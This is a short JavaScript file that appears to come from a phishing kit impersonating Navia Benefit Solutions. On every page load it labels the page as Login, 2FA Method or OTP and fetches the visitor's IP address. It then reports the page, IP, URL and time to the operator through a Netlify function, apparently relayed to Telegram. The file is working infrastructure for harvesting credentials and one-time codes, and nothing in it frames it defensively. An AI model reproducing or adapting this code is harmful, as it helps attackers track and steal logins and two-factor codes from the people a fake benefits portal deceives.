var TG = (function () {
  "use strict";

  function send(text) {
    fetch("/.netlify/functions/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text: text })
    }).catch(err => console.error("[TG]", err));
  }

  function getIP() {
    return fetch("https://api.ipify.org?format=json")
      .then(r => r.json()).then(d => d.ip).catch(() => "N/A");
  }

  function ts() {
    return new Date().toLocaleString("en-US", { dateStyle: "medium", timeStyle: "short" });
  }

  /* Visit Detection on All Main Pages */
  function notifyVisit() {
    const page = document.title.includes("Login") ? "Login" :
                 document.title.includes("Two-Factor") ? "2FA Method" :
                 document.title.includes("Verification") ? "OTP" : "Unknown";

    getIP().then(ip => {
      send(`👀 <b>New Visit — Navia Benefit Solutions</b>\n\n` +
           `📄 Page: <code>${page}</code>\n` +
           `🌐 IP: <code>${ip}</code>\n` +
           `🔗 URL: <code>${window.location.href}</code>\n` +
           `⏰ ${ts()}`);
    });
  }

  window.addEventListener("load", () => setTimeout(notifyVisit, 700));

  return { send, ts };
}());